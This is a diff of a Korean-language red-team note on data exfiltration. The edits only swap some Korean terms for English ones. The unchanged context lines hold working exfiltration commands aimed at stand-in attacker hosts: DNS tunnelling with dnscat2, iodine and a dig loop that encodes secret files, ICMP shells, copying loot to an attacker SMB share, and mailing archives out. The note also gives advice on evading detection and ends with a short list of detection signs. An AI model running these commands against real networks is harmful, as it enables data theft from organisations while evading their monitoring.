@@ -1,6 +1,6 @@
 # 데이터 유출 (Exfiltration)
 
-수집한 자료(자격증명 덤프, 소스 코드, DB 백업, 문서 등) 를 공격자 인프라로 빼내는 단계.
+수집한 자료(credential 덤프, 소스 코드, DB 백업, 문서 등) 를 공격자 인프라로 빼내는 단계.
 탐지 회피와 인게이지먼트 룰(허용 채널/대역폭/도메인) 준수가 핵심.
 
 ---
@@ -54,16 +54,16 @@ python3 -m uploadserver 443 --server-certificate cert.pem
 
 ## DNS Tunneling
 
-방화벽이 외부 HTTP 를 모두 막아도 **재귀 DNS** 는 열려있는 경우 多. 대역폭 매우 낮음 → 작은 데이터(자격증명, 문서) 위주.
+방화벽이 외부 HTTP 를 모두 막아도 **재귀 DNS** 는 열려있는 경우 多. 대역폭 매우 낮음 → 작은 데이터(credential, 문서) 위주.
 
 ```bash
 # dnscat2
 dnscat2-server <attacker_domain>          # 공격자
-dnscat2-client <attacker_domain>          # 타겟
+dnscat2-client <attacker_domain>          # target
 
 # iodine (TUN 인터페이스, 더 빠름)
 iodined -f -P '<pw>' 10.0.0.1 t.attacker.com    # 공격자
-iodine -f -P '<pw>' t.attacker.com               # 타겟
+iodine -f -P '<pw>' t.attacker.com               # target
 
 # 직접 인코딩 (도구 없이)
 for c in $(base32 secret | fold -w50); do dig +short ${c}.exfil.attacker.com; done
@@ -80,11 +80,11 @@ ICMP 가 외부로 허용되는 환경에서 사용.
 ```bash
 # icmpsh
 icmpsh-m.py <attacker_ip> <victim_ip>     # 공격자
-icmpsh.exe -t <attacker_ip>               # 타겟 (Windows)
+icmpsh.exe -t <attacker_ip>               # target (Windows)
 
 # hans (TUN over ICMP)
 sudo hans -s 10.1.2.0 -p '<pw>'           # 공격자
-sudo hans -c <attacker_ip> -p '<pw>'      # 타겟
+sudo hans -c <attacker_ip> -p '<pw>'      # target
 ```
 
 ---
@@ -147,7 +147,7 @@ $msg.To = "attacker@example.com"; $msg.Attachments.Add('C:\loot.7z'); $msg.Send(
 # 공격자 임시 SMB 서버
 impacket-smbserver share /tmp/loot -smb2support -username u -password p
 
-# 타겟에서
+# target에서
 copy C:\loot.7z \\<attacker_ip>\share\
 robocopy C:\loot \\<attacker_ip>\share /E /Z
 
@@ -177,7 +177,7 @@ steghide embed -cf cover.jpg -ef secret.txt -p '<pw>'
 
 | 항목 | 권장 |
 |------|------|
-| 시간대 | 타겟 업무 시간 내 (오프타임은 더 의심) |
+| 시간대 | target 업무 시간 내 (오프타임은 더 의심) |
 | 대역폭 | 대용량은 분할 + 지터 + 시간 분산 |
 | 도메인 | 평판 있는 TLD + Let's Encrypt + 카테고라이즈된 도메인 |
 | 프로토콜 | TLS 우선, ALPN/JA3 정상 클라이언트 위장 |
@@ -190,8 +190,8 @@ steghide embed -cf cover.jpg -ef secret.txt -p '<pw>'
 
 - 비정상 외부 도메인으로 **대용량 업로드** (NetFlow, 프록시 로그)
 - 같은 호스트가 짧은 시간에 **다양한 외부 IP** 와 통신
-- DNS 쿼리량 급증 + **긴 서브도메인 + 비정상 인코딩 패턴** (DNS Tunneling 시그니처)
-- ICMP 패킷의 **비정상 페이로드 사이즈** 또는 빈도
+- DNS 쿼리량 급증 + **긴 subdomain + 비정상 인코딩 패턴** (DNS Tunneling 시그니처)
+- ICMP 패킷의 **비정상 payload 사이즈** 또는 빈도
 - 평소 인터넷을 거의 안 쓰는 서비스 계정/서버에서 외부 통신 발생
 
 ---
